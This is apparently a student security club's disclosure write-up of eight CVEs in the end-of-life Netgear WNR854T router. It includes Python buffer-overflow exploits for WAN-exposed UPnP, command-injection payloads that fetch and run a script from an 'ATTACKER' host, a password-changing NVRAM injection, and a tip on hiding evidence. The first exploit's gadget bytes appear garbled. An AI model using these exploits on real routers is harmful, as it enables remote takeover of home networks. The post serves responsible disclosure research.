---
title: "'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard"
date: 2025-03-25
description: "How my university club dumpster dived eight CVEs for a year-0 conference including WAN RCE and NVRAM persistence."
tag: ["firmware rev","embedded"]
authors: [draz,elbee,vwing]
categories: ["Vulnerability Discovery"]
redirect_from:
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#802
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#803
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#804
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#805
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#806
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#807
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#808
    - /post/2025-03-25-8-cves-on-the-wnr854t-junkyard/#809
---

A subsect of student members from the Mason Competitive Cyber Club conducted research on an EOL device in preparation for the Junkyard contest at DistrictCon Year 0, unearthing eight new CVEs.
<!--more-->

# Table of contents
1. [Intro and Background](#intro)
2. [The Junkyard Competition](#junkyard)
3. [Disclosure Timeline](#timeline)
4. [A Note on post.cgi](#postcgi)
5. [Vulnerabilities Discovered](#vulns)
   1. [CVE-2024-54802](#cve-2024-54802)
   2. [CVE-2024-54803](#cve-2024-54803)
   3. [CVE-2024-54804](#cve-2024-54804)
   4. [CVE-2024-54805](#cve-2024-54805)
   5. [CVE-2024-54806](#cve-2024-54806)
   6. [CVE-2024-54807](#cve-2024-54807)
   7. [CVE-2024-54808](#cve-2024-54808)
   8. [CVE-2024-54809](#cve-2024-54809)

<a name="intro"></a>
### Intro and Background
The following post features technical details regarding vulnerabilities that were discovered in an EOL device by my school’s cybersecurity club in preparation for a competition at the inaugural DistrictCon security conference. For the past few months, Mason Competitive Cyber has been researching a target—namely the **Netgear WNR854T**—for security vulnerabilities, a project run by students and sponsored by club funds. The research resulted in the discovery of **eight previously unknown security issues**, including vulnerabilities that allow for **code execution from the WAN** and **payload injection into NVRAM** that **persists and triggers across reboot**.

Proof of concepts were developed and demonstrated live to convey the impact of the discovered issues and showcase the low-hanging fruit that frequently still exist in embedded systems. Points of contact and timelines were kept with both the DistrictCon organizers and the vendor to ensure a **90‑day responsible disclosure** window. Bugs mainly consist of **improper system calls** and **memory corruption** within both the router’s **UPnP** and **httpd** services.

Notes:
- All issues found with **UPnP** are **unauthenticated** (as the protocol traditionally is) and the router’s UPnP service is **exposed to the WAN**.
- The router’s **httpd** UI allows **direct NVRAM modification** (requires authentication), enabling chains such as:
  - Using UPnP to **port-forward** the webshell to the internet.
  - Changing credentials via NVRAM edits in the web UI or via UPnP bugs.
- Our testing and weaponization used **local firmware copies** and a **UART** interface. A **JTAG** header is also exposed and can be used to reflash the router in the event of bricking or boot loops (possible with persistent NVRAM bugs).

<a name="junkyard"></a>
### The Junkyard Competition
The Junkyard competition was an **end‑of‑life pwnathon** for disclosing zero‑days on end‑of‑service devices with prize categories for *most memeable target*, *most impactful target*, *most novel technique*, and their runners‑up. Competitors had **ten minutes** to demonstrate **live PoCs** against their targets. Devices had to be **officially EoS/EoL** (and initially, vulnerabilities needed CVEs).

The Mason Competitive Cyber team consisted of researchers **vWing**, **draz**, and **elbee**. We chose the **Netgear WNR854T**, which was readily available (previously used in draz’s home). The team was approved for **two talk slots** to demonstrate **seven** of the **eight** vulnerabilities live.

![](/assets/posts/2025-03-25/1.png)

It was found the target device had only one previously reported unauthenticated command execution issue; we expected additional “easy wins.” Many props to DistrictCon for running a uniquely fun contest and a surprisingly high‑quality first‑year conference (even without power!).

<a name="timeline"></a>
### Disclosure Timeline
![](/assets/posts/2025-03-25/2.png)

<a name="postcgi"></a>
### A Note on post.cgi
There exists an **httpd** route that allows configuring arbitrary system information—`post.cgi` (requires authentication). In the posted data, a `command` key can contain: `device_data`, `reset_to_default`, `system_restart`, `system_reboot`. The **device_data** path lets an authenticated user **arbitrarily set NVRAM** entries. Various NVRAM parameters are consumed by both **httpd** and **sysinit**, enabling **persistent** and **non‑persistent** command‑injection scenarios.

![](/assets/posts/2025-03-25/3.png)

<a name="vulns"></a>
## Vulnerabilities Discovered

<a name="cve-2024-54802"></a>
### MSEARCH Host BOF (CVE-2024-54802)

**Summary.** Stack‑based BOF in **UPnP** (`/usr/sbin/upnp`) on **M-SEARCH Host** header. Root cause is an **unbounded `strcpy`** into a fixed‑size stack buffer inside `advertise_res` (0x22bc4), allowing memory corruption and **RCE**.

**Vulnerable component.** `advertise_res` copies the Host header into a local buffer using `strcpy` with no bounds checking.

![](/assets/posts/2025-03-25/4.png)

**Attack type/impact.** **Unauthenticated, remote**. UPnP runs on the **WAN**. Successful exploitation yields **RCE**.

**Attack vector.** Malicious **M-SEARCH** with an oversized `Host` header. Overwrites return state and hijacks control flow.

**Exploitation.** Overwrite saved LR/PC and pivot into a gadget at **0x2d4dc** (`mov r0, r5 ; bl system`) to invoke `system()` with an attacker‑controlled argument.

```py
payload_pt1 = b'Z' * 304
payload_pt2 = b'A' * 4  # R4
payload_pt2 += b'B' * 4  # R5 - command str will go here
payload_pt2 += b'C' * 4  # R6
payload_pt2 += b'D' * 4  # R7
payload_pt2 += b'E' * 4  # R8
payload_pt2 += b'ÜÔ'  # 0x2d4dc mov r0, r5 ; bl system

def send_msearch_pwn(target_port=1900):
    global payload_pt1, payload_pt2
    ret = p32(0xbeffeb20 + (len(cmd.encode()) * 3) + 1)
    payload_pt2 = payload_pt2.replace(b'BBBB', ret)

    message = (
        payload_pt1 + b'\r\n' +
        payload_pt2 + b'\r\n' +
        b'MAN:"ssdp:discover"\r\n'
        b'MX:2\r\n'
        b'\r\n'
    ) + p32(0xdeadbeef) + (b" " * 255) + cmd.encode()

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
        sock.settimeout(2)
        sock.sendto(message, (host, target_port))
```

---

<a name="cve-2024-54803"></a>
### PPPOE_PEER_MAC Authenticated Command Injection (Boot Persistent) (CVE-2024-54803)

**Summary.** Authenticated **command injection** in `/bin/sysinit` via NVRAM `pppoe_peer_mac`. Unsanitized value is inserted into a `sprintf` format and executed via `system()` **during boot**, yielding **persistent** root‑level execution when `wan_proto=pppoe`.

![](/assets/posts/2025-03-25/5.png)

**Exploit format.**
```
pppoe_peer_mac=;command_to_execute #
```
Example:
```
pppoe_peer_mac=;{wget http://ATTACKER/m.sh -P /tmp/ && /tmp/m.sh} #
```

Steps:
1. Set `wan_proto=pppoe`.
2. Set `pppoe_peer_mac` to injected payload.
3. Reboot; command runs with root at startup.

---

<a name="cve-2024-54804"></a>
### WAN_HOSTNAME Authenticated Command Injection (Boot Persistent) (CVE-2024-54804)

**Summary.** Authenticated **command injection** in `/bin/sysinit` via **`wan_hostname`**; value flows to:
```c
sprintf(var, "netbios %s %s &", r4, r3)  // r3 = wan_hostname
```
Executed later via `system()`, **persisting** across reboots.

![](/assets/posts/2025-03-25/6.png)

**Exploit format.**
```
wan_hostname=;command_to_execute #
```
Example (change admin password):
```
wan_hostname=;nvram set http_passwd=pwnd #
```

---

<a name="cve-2024-54805"></a>
### Sendmail Authenticated Command Injection (CVE-2024-54805)

**Summary.** Authenticated **command injection** in `/bin/httpd` email alerts flow. `email_address` NVRAM is placed into:
```
/bin/sendmail %s -f %s &
```
No sanitization; **backtick** injection allows arbitrary command execution, triggerable on demand via `/send_log.cgi`.

![](/assets/posts/2025-03-25/7.png)

**Exploit example.**
```
`wget http://ATTACKER/m.sh -P /tmp/`@example.com
```
Workflow: set malicious email → enable alerts → call `/send_log.cgi`.

---

<a name="cve-2024-54806"></a>
### Authenticated Webshell (CVE-2024-54806)

**Summary.** A rudimentary **webshell** exists at `cmd.cgi` (0x15c50). Execution is **authenticated** (tied to `post.cgi`). Output formatting is poor but functional.

![](/assets/posts/2025-03-25/8.png)

---

<a name="cve-2024-54807"></a>
### AddPortMapping Command Injection (CVE-2024-54807)

**Summary.** **Unauthenticated** command injection in UPnP `AddPortMapping` (0x2b530) of `/upnp/control/WANIPConnection1`. The **`NewInternalClient`** argument is concatenated into an `iptables` command that flows to `system()` (0x2d3bc). **WAN‑facing**.

![](/assets/posts/2025-03-25/9.png)

**Exploit idea.**
```xml
<NewInternalClient>192.168.1.3 $(whoami)</NewInternalClient>
```
Attackers can remove evidence by deleting the mapping afterward.

---

<a name="cve-2024-54808"></a>
### SetDefaultConnectionService BOF (CVE-2024-54808)

**Summary.** Stack‑based BOF in UPnP **L3Forwarding** `SetDefaultConnectionService` (0x28e8c) due to unconstrained `sscanf` into a local buffer. PC hijack is possible, but **weaponization is constrained** by XML parsing (ASCII‑only) and return‑address layout.

![](/assets/posts/2025-03-25/10.png)

We targeted a known gadget at **0x2d4dc** (`mov r0, r5 ; bl system`).

![](/assets/posts/2025-03-25/11.png)

**Constraints on weaponization.**
- ASCII‑only payloads (`0x20–0x7e`), null termination issues.
- Original RA looks like `0x0002nnnn`; partial overwrites are tricky due to deep call graph and dereferences.
- Single‑byte or null‑byte overwrites crash early (argument setup skipped).

![](/assets/posts/2025-03-25/12.png)
![](/assets/posts/2025-03-25/13.png)
![](/assets/posts/2025-03-25/14.png)
![](/assets/posts/2025-03-25/15.png)

**Idea for full weaponization.** If null‑byte appendage constraints could be bypassed, a **two‑byte overwrite** may reach a `pop;pop;pop;ret` to pivot into **heap** (executable) where shellcode can be staged via request headers, then hit via controlled misalignment / grooming.

---

<a name="cve-2024-54809"></a>
### MSEARCH ST BOF (CVE-2024-54809)

**Summary.** Stack‑based BOF in UPnP **`parse_st`** (0x23240) handling **M‑SEARCH ST** header. An arithmetic error produces an **over‑large `n`** passed to `strncpy`, overflowing a stack buffer and enabling **RCE**.

![](/assets/posts/2025-03-25/16.png)

**Attack vector.** Oversized **ST** header inside **M‑SEARCH**. **Unauthenticated**, WAN‑exposed.

**Exploitation.** Overwrite saved LR/PC, return to **0x2d4dc** (`mov r0, r5 ; bl system`) with controlled argument.

```py
payload = b'Z' * 284
payload += b'A' * 4  # R4
payload += b'B' * 4  # R5 - command str will go here
payload += b'C' * 4  # R6
payload += b'D' * 4  # R7
payload += b'E' * 4  # R8
payload += b'\xdc\xd4\x02'  # 0x2d4dc mov r0, r5 ; bl system

def send_msearch_pwn(target_port=1900):
    global payload
    # Space nopsled might shift depending on len(cmd) (+1 for null)
    ret = p32(0xbefff540 + (len(cmd.encode()) * 3) + 1)
    payload = payload.replace(b'BBBB', ret)

    message = (
        b'M-SEARCH * HTTP/1.1\r\n'
        b'HOST:239.255.255.250:1900\r\n'
        b'MAN:"ssdp:discover"\r\n'
        b'MX:2\r\n'
        b'ST:uuid:schemas:device:' + payload + b':\x00\r\n'
        b'\r\n'
    ) + p32(0xdeadbeef) + (b" " * 255) + cmd.encode()

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
        sock.settimeout(2)
        sock.sendto(message, (host, target_port))
```